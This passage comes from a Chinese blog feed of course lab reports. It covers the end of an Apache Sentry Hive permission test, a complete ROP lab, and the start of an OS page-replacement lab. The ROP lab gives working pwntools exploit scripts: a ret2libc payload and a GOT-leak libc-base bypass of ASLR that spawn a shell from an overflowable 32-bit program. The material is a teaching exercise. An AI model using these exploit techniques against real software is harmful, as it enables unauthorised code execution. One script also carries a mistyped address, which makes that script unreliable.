src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203202604.png" alt=""></p></li><li><p>输入<code>create role grader_role;</code>创建新角色；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203202704.png" alt=""></p></li><li><p>输入<code>grant insert on table gradebook to role grader_role;</code>使得grader_role只能插入数据到gradebook表中；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203202759.png" alt=""></p></li><li><p>输入<code>grant role student_role to group student;</code>将student_role的权力赋予给student组；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203203029.png" alt=""></p></li><li><p>输入<code>grant role grader_role to group grader;</code>将grader_role的权力赋予给grader组；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203202912.png" alt=""></p></li></ol><h2 id="权限测试"><a href="#权限测试" class="headerlink" title="权限测试"></a>权限测试</h2><ol><li><p>重新打开一个终端并启动beeline，输入<code>!connect jdbc:hive2://localhost:10000</code>后回车，用户名为grader，密码为空登录该用户；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203203412.png" alt=""></p></li></ol><ol start="2"><li><p>输入<code>use school;</code>选择school数据库；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203203449.png" alt=""></p></li></ol><ol start="3"><li><p>输入<code>select * from gradebook;</code>，确认grader没有权力查看该表；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203203619.png" alt=""></p></li><li><p>输入<code>insert into gradebook values(&#39;10003&#39;,&#39;wu&#39;,&#39;wang&#39;,100);</code>将数据插入到表中；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203213514.png" alt=""></p></li><li><p>由于grader无权查看数据，新建终端启动beeline，以hive的身份进入数据库，输入<code>use school;</code>切换数据库并输入<code>select * from gradebook;</code>，根据下图显示，确认grader的数据正确插入到数据库中；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203213947.png" alt=""></p></li></ol><ol start="6"><li><p>退出该终端，启动新终端进入beeline，以student的身份登录系统。输入<code>use school;</code>切换数据库并输入<code>select * from gradebook;</code>发现student是否可以查看gradebook的全部数据；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203234137.png" alt=""></p><p>输入<code>select id,first,last from gradebook;</code>确认student可以查看已授予查看权限的id、first、last列；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203234617.png" alt=""></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 大数据安全实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Apache Sentry </tag>
            
            <tag> cloudera quickstart </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞分析技术实验二</title>
      <link href="/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%BA%8C.html"/>
      <url>/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%BA%8C.html</url>
      
        <content type="html"><![CDATA[<h1 id="实验目标"><a href="#实验目标" class="headerlink" title="实验目标"></a>实验目标</h1><p>掌握如何利用ROP技术绕过安全保护机制。</p><h1 id="实验内容要求"><a href="#实验内容要求" class="headerlink" title="实验内容要求"></a>实验内容要求</h1><ol><li>基于讲义实验一中的<code>rop1.c</code>，在关闭栈保护canary和ASLR内存地址随机化保护，开启NX保护的条件下，编写可用的ROP脚本对程序流进行劫持，从而执行<code>system(/bin/sh)</code>获得shell。要求详细分析ROP的原理，对漏洞利用详细过程进行详细的截图分析，并提供可在所提供虚拟机环境中可执行的脚本，以供实际验证；</li><li>基于讲义实验二中的<code>rop1.c</code>，编译为32位程序。在关闭栈保护canary，开启NX保护和ASLR内存地址随机化保护的条件下，编写可用的ROP脚本对程序流进行劫持，从而执行<code>system(/bin/sh)</code>获得shell。要求详细分析ROP的原理，对漏洞利用详细过程进行详细的截图分析，并提供可在所提供虚拟机环境中可执行的脚本，以供实际验证；<a id="more"></a></li></ol><h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><ol><li>Linux操作系统</li><li>python语言环境</li><li>gdb调试器</li><li>IDA Pro</li></ol><h1 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h1><h2 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h2><h3 id="关闭canary和ASLR，开启NX"><a href="#关闭canary和ASLR，开启NX" class="headerlink" title="关闭canary和ASLR，开启NX"></a>关闭canary和ASLR，开启NX</h3><p>关闭栈保护canary和ASLR内存地址随机化保护，开启NX保护，编译<code>rop1.c</code>到rop1；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc rop1.c -o rop1 -m32 -fno-stack-protector -z execstack</span><br><span class="line">sudo sh -c "echo 0 &gt; /proc/sys/kernel/randomize_va_space"</span><br><span class="line">gcc rop1.c -o rop1 -m32 -fno-stack-protector</span><br><span class="line">checksec rop1</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191021151107.png" alt=""></p><h3 id="查看NX保护"><a href="#查看NX保护" class="headerlink" title="查看NX保护"></a>查看NX保护</h3><p>rop2进程栈的权限为<strong><code>rw</code></strong>，不可执行</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191021151359.png" alt=""></p><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>程序源代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>,buf,<span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="built_in">write</span>(<span class="number">1</span>,<span class="string">"hello rop\n"</span>,<span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数组buf大小为128字节，但是read函数读进256字节，因此可以利用缓冲区溢出漏洞对程序流进行劫持攻击。可以通过向buf里面填充大于128字节的数据造成缓冲区溢出，并且覆盖vuln函数的返回地址为buf数组，使程序执行buf数组里的恶意代码。</p><p>但是由于开启了NX保护，不能在栈中执行代码，因此不能直接把shellcode写在栈中执行，只能调用系统函数达到getshell的目的。</p><ul><li>程序中用到了libc库中的read和printf函数。<code>libc.so</code>中保存了大量的可用函数，可以调用<code>system(&#39;/bin/sh&#39;)</code>来获取shell；</li><li>关闭了ASLR后，system函数在内存中地址不会发生变化；</li></ul><h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><ol><li><p>查看vuln函数的地址；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191021150411.png" alt=""></p></li><li><p>确定覆盖字节数</p><p>buf的存储地址是<code>ebp-0x88</code>，根据上图汇编代码，栈抬高了<code>0x88+0x4 = 0x8c</code>个字节，因此需要在栈中填充<code>0x8c</code>个字节的数据来覆盖返回地址；</p></li><li><p>在vuln函数处设置断点并且运行；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191021150733.png" alt=""></p></li><li><p>查看系统函数地址为<code>0xf7e40da0</code>；<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191021140529.png" alt=""></p></li><li><p>查看libc的起始地址为<code>0xf7e06000</code>，结束地址为<code>0xf7fb9000</code>；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191021140820.png" alt=""></p></li><li><p>在libc中查找<code>/bin/sh</code>命令的地址为<code>0xf7f61a0b</code>；</p><p><img src="C:%5CUsers%5CLevi%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1571638322283.png" alt="1571638322283"></p></li></ol><h3 id="构造ROP"><a href="#构造ROP" class="headerlink" title="构造ROP"></a>构造ROP</h3><ol><li><p>payload结构为<code>0x8c字节的数据+系统函数地址+任意返回地址+/bin/sh的地址</code>，先 填充<code>0x8c</code>字节的数据，然后调用系统函数，以<code>/bin/sh</code>作为参数，即</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'a'</span>*<span class="number">0x8c</span> + p32(<span class="number">0xf7e40da0</span>) + p32(任意地址) + p32(<span class="number">0xf7f61a0b</span>)</span><br></pre></td></tr></table></figure></li><li><p>payload脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./rop2'</span>)</span><br><span class="line">sys_addr = <span class="number">0xf7e40da</span></span><br><span class="line">binsh_addr = <span class="number">0xf7f61a0b</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x8c</span> + p32(sys_addr) + p32(<span class="number">0x11111111</span>) + p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h3 id="执行脚本"><a href="#执行脚本" class="headerlink" title="执行脚本"></a>执行脚本</h3><p>顺利执行<code>ls</code>命令，漏洞利用成功。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191021145734.png" alt=""></p><h2 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h2><h3 id="关闭canary，开启ASLR和NX"><a href="#关闭canary，开启ASLR和NX" class="headerlink" title="关闭canary，开启ASLR和NX"></a>关闭canary，开启ASLR和NX</h3><p>关闭栈保护canary，开启ASLR内存地址随机化保护和NX保护，编译<code>rop1.c</code>到rop2；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc rop1.c -o rop2 -m32 -fno-stack-protector -z execstack</span><br><span class="line">sudo sh -c "echo 2 &gt; /proc/sys/kernel/randomize_va_space"</span><br><span class="line">gcc rop1.c -o rop2 -m32 -fno-stack-protector</span><br><span class="line">checksec rop2</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191021152832.png" alt=""></p><p> 此时动态库的基址是会发生变化的；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191021154338.png" alt=""></p><h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><ul><li><p>利用write函数打印出write函数对应的got表里的内容，只要打印got表中存在的函数的地址就可以计算出libc的基址；</p></li><li><p>虽然write函数的地址并不是固定的，但是程序本身使用过这个函数，所以PLT表里一定有这个函数，PLT表又属于本身程序的代码段，在没有开启PIE的情况下，write函数对应的PLT表项的地址是确定的；</p></li><li><p>同理GOT表项的地址也是不变的，变的只是GOT表项的内容；</p></li><li><p>可以将返回地址覆盖为write函数对应的PLT表的地址，参数布置为<code>0x1</code>，write函数对应的got表项的地址，参数布置为<code>0x4</code>，其中<code>0x1</code>是标准输出（即从终端显示输出结果），<code>0x4</code>是输出的长度 ;</p></li><li><p>再将write函数的返回地址布置为vuln这个函数的地址，执行完write函数后，返回到vuln函数，进行二次溢出，获得shell，其中vuln函数地址为<code>0x0804843b</code>；</p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191021201744.png" style="zoom:150%;" /></li><li><p>使用IDA找到write函数对应的PLT表项的地址为<code>0x08048320</code>；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191021160415.png" alt=""></p></li><li><p>使用IDA找到write函数对应的GOT表项的地址为<code>0x0804A014</code>；</p><p><img src="C:%5CUsers%5CLevi%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1571645227781.png" alt="1571645227781"></p></li><li><p>覆盖前的堆栈结构为</p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191021161041.png" style="zoom:80%;" /></li><li><p>覆盖后的堆栈结构为</p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191021161258.png" style="zoom:67%;" /></li><li><p>打印出write 的地址后，计算出system函数的地址，然后利用二次栈溢出，覆盖返回地址为system函数地址，布置参数为<code>/bin/sh</code>字符串的首地址。<br><code>/bin/sh</code>这个字符串也可以在libc中找到。</p></li></ul><h3 id="构造ROP脚本如下"><a href="#构造ROP脚本如下" class="headerlink" title="构造ROP脚本如下"></a>构造ROP脚本如下</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">libc = ELF(<span class="string">"libc.so.6"</span>)</span><br><span class="line">p = process(<span class="string">"./rop2"</span>)</span><br><span class="line">plt_write = <span class="number">0x08048320</span><span class="comment">#write函数的plt地址</span></span><br><span class="line">vuln_addr = <span class="number">0x0804843b</span><span class="comment">#vuln函数的地址</span></span><br><span class="line">got_write = <span class="number">0x0804A014</span><span class="comment">#write函数的got地址</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x8c</span>+p32(plt_write)+p32(vuln_addr)+p32(<span class="number">1</span>)+p32(got_write)+p32(<span class="number">4</span>)</span><br><span class="line">p.send(payload)<span class="comment">#构造并发送第一次的payload</span></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))<span class="comment">#接受返回的write函数的地址</span></span><br><span class="line">libc_base = write_addr - libc.symbols[<span class="string">"write"</span>]<span class="comment">#根据相对地址不变，计算libc基址</span></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">"system"</span>]<span class="comment">#计算system函数地址</span></span><br><span class="line">binbash_addr = libc_base + next(libc.search(<span class="string">"/bin/sh"</span>))<span class="comment">#计算/bin/sh地址</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x8c</span> + p32(system_addr) + p32(<span class="number">1</span>) + p32(binbash_addr)</span><br><span class="line">p.send(payload)<span class="comment">#构造并发送第二次的payload</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="执行脚本-1"><a href="#执行脚本-1" class="headerlink" title="执行脚本"></a>执行脚本</h3><p>顺利执行<code>ls</code>、<code>whoami</code>等命令，漏洞利用成功。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191021202654.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析技术实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统内核-实验三</title>
      <link href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8-%E5%AE%9E%E9%AA%8C%E4%B8%89.html"/>
      <url>/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8-%E5%AE%9E%E9%AA%8C%E4%B8%89.html</url>
      
        <content type="html"><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ol><li>理解内存页面调度的机理；</li><li>掌握几种理论调度算法实现；</li><li>通过实验比较各种调度算法的优劣；</li><li>通过实验了解HASH表数据结构的使用；<a id="more"></a></li></ol><h1 id="准备知识"><a href="#准备知识" class="headerlink" title="准备知识"></a>准备知识</h1><ol><li><p>C++、指针和结构体(类)</p></li><li><p>哈希表查找方式</p></li><li><p>操作系统内存交换的知识</p></li><li><p>可能用到的几个函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getpid</span> <span class="params">()</span><span class="comment">//获得当前进程的pid</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">srand</span> <span class="params">(<span class="keyword">int</span> a)</span><span class="comment">//以a为种子产生随机数</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rand</span> <span class="params">()</span><span class="comment">//根据前面的种子，返回一个随机数</span></span></span><br></pre></td></tr></table></figure></li></ol><h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><p>对比以下几种页面置换算法的命中率</p><ol><li>先进先出的算法FIFO(First In First Out)</li><li>最近最少使用的算法LRU(Least Recently Used)</li><li>最近未使用算法NUR(Never Recently Used)</li><li>最佳置换算法OPT(Optimal Replacement)</li></ol><h1 id="页面置换算法介绍"><a href="#页面置换算法介绍" class="headerlink" title="页面置换算法介绍"></a>页面置换算法介绍</h1><h2 id="FIFO页面置换算法"><a href="#FIFO页面置换算法" class="headerlink" title="FIFO页面置换算法"></a>FIFO页面置换算法</h2><h3 id="原理简述"><a href="#原理简述" class="headerlink" title="原理简述"></a>原理简述</h3><ol><li>在分配内存页面数(AP)小于进程页面数(PP)时，最先的AP个页面放入内存；</li><li>需要处理新页面时，将原来在内存中的AP个页面中最先进入的调出，放入新的页面；</li><li>算法特点：使用内存页面构成一个队列；</li></ol><h3 id="图表描述"><a href="#图表描述" class="headerlink" title="图表描述"></a>图表描述</h3><ul><li><p>假设某个进程在硬盘上被划分为5个页面(PP=5)，以<code>1、2、3、4、5</code>分别表示，处理机调用它们的顺序为：<code>1、4、2、5、3、3、2、4、2、5</code>；</p></li><li><p>假设内存控制的页面数为3(AP=3)，那么在FIFO算法时，这3个页面的内存使用情况如下图所示 </p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1571155503183.png" alt="1571155503183"></p></li><li><p>共换入页面8次，<code>diseffect=8</code>；</p></li></ul><h3 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h3><ul><li><p>要得到命中率，必然要有一个常量<code>total_instruction</code>记录页面总共使用次数；此外需要一个变量记录总共换入页面的次数(需要换出页面，总是因为没有命中而产生的)diseffect，可利用公式得到命中率(公式如下)。</p><ol><li><p>初始化，设置两个数组<code>page[ap]</code>和<code>pagecontrol[pp]</code>分别表示进程页面数和内存分配的页面数，并产生一个的随机数序列<code>main[total_instruction]</code>(当然这个序列由<code>page[]</code>的下标随机构成)，表示待处理的进程页面顺序，diseffect置0；</p></li><li><p>看<code>main[]</code>中是否有下一个元素，有就由<code>main[]</code>中获取该页面下标，并转到步骤3；若没有，就转到步骤7；</p></li><li><p>如果该page页已在内存中，就转到步骤2；否则就到步骤4，同时未命中的diseffect加1；</p></li><li><p>观察pagecontrol是否占满，如果占满需将使用队列(步骤六中建立的)中最先进入的(就是队列第一个单元)pagecontrol单元“清干净”，同时将对应的<code>page[]</code>单元置为“不在内存中”。</p></li><li><p>将该<code>page[]</code>与<code>pagecontrol[]</code>建立关系(可以改变<code>pagecontrol[]</code>的标示位，也可以采用指针连接。总之，至少要使对应的pagecontrol单元包含两个信息：一是它被使用了，二是哪个<code>page[]</code>单元使用的；<code>page[]</code>单元包含两个信息：对应的pagecontrol单元号、本<code>page[]</code>单元已在内存中)； </p></li><li><p>将用到的pagecontrol置入使用队列(这里的队列当然是一种先进先出的数据结构)，返回步骤2；</p></li><li><p>显示命中率(命中率公式如下) ，算法完成。<br>$$<br>hit_-rate=1-\frac{diseffect}{total_-instruction}\times100%<br>$$</p></li></ol></li></ul><h2 id="LRU页面置换算法"><a href="#LRU页面置换算法" class="headerlink" title="LRU页面置换算法"></a>LRU页面置换算法</h2><h3 id="原理简述-1"><a href="#原理简述-1" class="headerlink" title="原理简述"></a>原理简述</h3><ol><li>在分配内存页面数(AP)小于进程页面数(PP)时，最先的AP个页面放入内存；</li><li>当需要调入页面进入内，而当前分配的内存页面不空闲时，选择其中最长时间没有用的那个页面调出，以控制内存来放置新调入的页面；</li><li>算法特点：每个页面都有属性表示有多长时间未被CPU使用的信息；</li></ol><h3 id="图表描述-1"><a href="#图表描述-1" class="headerlink" title="图表描述"></a>图表描述</h3><ul><li><p>假设某个进程与内存可控制页面数不变：<code>AP=3</code>，<code>PP=5</code>；</p></li><li><p>处理机调用它们的顺序不变：<code>1、4、2、5、3、3、2、4、2、5</code></p></li><li><p>使用LRU算法时，这3个页面的内存使用情况如下图所示</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1571062544372.png" alt="1571062544372"></p></li><li><p>共换入页面7次，<code>diseffect=7</code>；</p></li></ul><h3 id="算法实现-1"><a href="#算法实现-1" class="headerlink" title="算法实现"></a>算法实现</h3><ul><li>和FIFO算法相同，只有先得到diseffect才能获得最终“命中率”；<ol><li>初始化，主要是进程页面<code>page[]</code>和分配的内存页面<code>pagecontrol[]</code>，同时产生随机序列<code>main[]</code>，diseffect置0；</li><li>看序列<code>main[]</code>是否有下一个元素，有就由<code>main[]</code>中获取该页面下标，并转到步骤3；若没有，就转到步骤6；</li><li>如果该page页已在内存中，便改变页面属性，使它保留“最近使用”的信息，转到步骤2；否则就到步骤4，同时未命中的diseffect加1；</li><li>判断是否有空闲的内存页面，如果有，就返回页指针，转到步骤5；否则在内存页面中找出最长时间没有使用到的页面，将其“清干净”，并返回该页面指针；</li><li>在需要处理的<code>page[]</code>与步骤4中得到的<code>pagecontrol[]</code>建立关系，同时让对应的<code>page[]</code>单元保存“最新使用”的信息，返回步骤2； </li><li>如果序列处理完成，就输出命中率(命中率公式同上)，算法结束。</li></ol></li></ul><h2 id="NUR页面置换算法"><a href="#NUR页面置换算法" class="headerlink" title="NUR页面置换算法"></a>NUR页面置换算法</h2><h3 id="原理简述-2"><a href="#原理简述-2" class="headerlink" title="原理简述"></a>原理简述</h3><ul><li>所谓的“最近未使用”首先要对“近”做一个界定，比如<code>CLEAR_PERIOD=50</code>，便是在CPU最近执行的50次进程页面处理工作中，找出这50次都没有处理的页面；<ol><li>如果这样的页面只有一个，就将其换出，放入需处理的新页面；</li><li>如果有不止一个这样的页面，在这些页面中任取出一个换出，放入需处理的页面；</li><li>如果没有这样的页面，则随意换出一个页面(页码可以最大也可以最小)；</li></ol></li><li>算法特点：有一个循环周期，每达到这个周期，所有页面存放是否被CPU处理信息的属性均被置于初始态；</li></ul><h3 id="图表描述-2"><a href="#图表描述-2" class="headerlink" title="图表描述"></a>图表描述</h3><ul><li><p>假设某个进程与内存可控制页面数不变：<code>AP=3，PP=5</code>；</p></li><li><p>处理机调用它们的顺序不变：<code>1、4、2、5、3、3、2、4、2、5</code>；</p></li><li><p>使用NUR算法时，这3个页面的内存使用情况如下图所示；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1571157657346.png" alt="1571157657346"></p></li></ul><h3 id="算法实现-2"><a href="#算法实现-2" class="headerlink" title="算法实现"></a>算法实现</h3><p>需要对数组设置“访问位”标识；</p><ol><li>初始化，设置两个数组<code>page[ap]</code>和<code>pagecontrol[pp]</code>分别表示进程页面数和内存分配的页面数，并产生一个的随机数序列<code>main[total_instruction]</code>（当然这个序列由<code>page[]</code>的下标随机构成），表示待处理的进程页面顺序，diseffect置0，设定循环周期CLEAR_PERIOD；</li><li>看<code>main[]</code>中是否有下一个元素，有就从<code>main[]</code>中获得一个CPU将处理页面的序号；没有，就转到步骤8；</li><li>如果待处理的页面已在内存中，就转到步骤2；否则diseffect加1，并转到步骤4；</li><li>看是否有空闲的内存页面，如果有，返回空闲页面指针，转到步骤5；否则，在所有没有被访问且位于内存中的页面中按任意规则（或者取最近的一个页面；或者取下标最小的页面，等等）取出一个，返回清空后的内存页面指针；</li><li>在待处理进程页面与内存页面之间建立联系，并标注该页面被访问；</li><li>如果CPU已处理了CLEAR_PERIOD个页面，就将所有页面均设为“未访问”；</li><li>返回步骤2；</li><li>如果CPU所有处理工作完成，就返回命中率的结果，算法结束。</li></ol><h2 id="OPT页面置换算法"><a href="#OPT页面置换算法" class="headerlink" title="OPT页面置换算法"></a>OPT页面置换算法</h2><h3 id="原理简述-3"><a href="#原理简述-3" class="headerlink" title="原理简述"></a>原理简述</h3><p>在分配的内存页面占满的情况下，最佳置换算法是一种理想状况下的算法，他要求先遍历所有的CPU待处理的进程页面序列（实际上，由于待处理的页面有取决于先前处理的页面，所有很多情况下不可能得到完整的待处理页面序列。在这个层面上，才说该算法足理想的。)，在这些页面中，如果有已经在内存当中，而不再处理的，就将其换出：如果页面在内存中，并待处理，就取从当前位置算起，最后处理到的页面，将其换出。比如待处理的页面序列号为：</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1571070639492.png" alt="1571070639492"></p><p>已经处理了5个页面，那么页面5是第一个待处理的页面：2是第二个；1是第四个；4是第五个；3是第六个。那么页面3就是针对当前位置而言，最后处理到的页面。</p><h3 id="图表描述-3"><a href="#图表描述-3" class="headerlink" title="图表描述"></a>图表描述</h3><ul><li><p>假设某个进程与内存可控制页面数不变：<code>AP=3，PP=5</code>；</p></li><li><p>处理机调用它们的顺序不变：<code>1、4、2、5、3、3、2、4、2、5</code></p></li><li><p>使用OPT算法时，这3个页面的内存使用情况如下图所示；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1571190143264.png" alt="1571190143264"></p></li><li><p>一共发生了6次页面交换，<code>diseffect=6</code>；</p></li></ul><h3 id="算法实现-3"><a href="#算法实现-3" class="headerlink" title="算法实现"></a>算法实现</h3><ol><li>初始化，设置两个数组<code>page[ap]</code>和<code>pagecontrol[pp]</code>分别表示进程页面数和内存分配的页面数，并产生一个的随机数序列<code>main[total_instruction]</code>（当然这个序列由page[]的下标随机构成），表示待处理的进程页面顺序，diseffect置0，然后扫描整个页面访问序列,对<code>vDistance[TOTAL_VP]</code>数组进行赋值，表示该页面将在第几步被处理；</li><li>看<code>main[]</code>中是否有下一个元素，有就从<code>main[]</code>中获取一个CPU待处理的页面号；没有，就转到步骤6；</li><li>如果该page页已在内存中，就转到步骤2；否则就到步骤4，同时未命中的diseffect加1；</li><li>看是否有空闲的内存页面，如果有，就直接返回该页面指针；如果没有，遍历所有未处理的进程页面序列，如果有位于内存中的页面，而以后CPU不再处理，首先将其换出，返回页面指针；如果没有这样的页面，找出CPU最晚处理到的页面，将其换出，返回该内存页面指针；</li><li>在内存页面和待处理的进程页面之间建立联系，返回步骤2；</li><li>输出命中率，算法结束。（命中率在扫描时完成计算）</li></ol><h1 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h1><p>数据结构的详细分析在注释中已经标注；</p><h2 id="CPage类"><a href="#CPage类" class="headerlink" title="CPage类"></a>CPage类</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CPage</span>&#123;</span><span class="comment">//进程使用的页面</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">int</span> m_nPageNumber;<span class="comment">//页号 </span></span><br><span class="line"><span class="keyword">int</span>m_nPageFaceNumber;<span class="comment">//对应的物理内存页号，初始为INVALID </span></span><br><span class="line"><span class="keyword">int</span>m_nCounter;<span class="comment">//计数 </span></span><br><span class="line"><span class="keyword">int</span>m_nTime;<span class="comment">//时间信息 </span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="CPageControl类"><a href="#CPageControl类" class="headerlink" title="CPageControl类"></a>CPageControl类</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CPageControl</span>&#123;</span><span class="comment">//分配给进程的物理内存页面</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">int</span> m_nPageNumber;<span class="comment">//表示物理内存页号（帧号） </span></span><br><span class="line"><span class="keyword">int</span> m_nPageFaceNumber;<span class="comment">//表示物理内存的页号</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span 